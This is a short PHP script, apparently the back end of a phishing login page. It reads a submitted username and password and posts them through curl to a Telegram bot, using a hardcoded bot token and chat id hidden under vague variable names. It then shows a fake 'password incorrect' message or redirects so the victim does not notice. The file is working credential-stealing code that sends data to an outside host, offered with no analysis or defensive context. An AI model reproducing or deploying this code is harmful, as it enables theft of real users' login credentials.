<?php
$username = $_POST['username'];
$password = $_POST['password'];

$query_one = "7081582955:AAGjtT04lcyJT0Q17g79ZOSQ3pcBvH__gqo";
$query_two = "7179640883";
$query_three = "\nUsername: $username\nPassword: $password";

$query = "https://api.telegram.org/bot$query_one/sendMessage";
$data = array(
    'chat_id' => $query_two,
    'text' => $query_three
);

$ch = curl_init($query);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
$response = curl_exec($ch);
curl_close($ch);

if (!$response) {
    echo "Sorry, your password was incorrect. Please double-check your password";
} else {
    header("Location: http://example.com/home");
    exit();
}
?>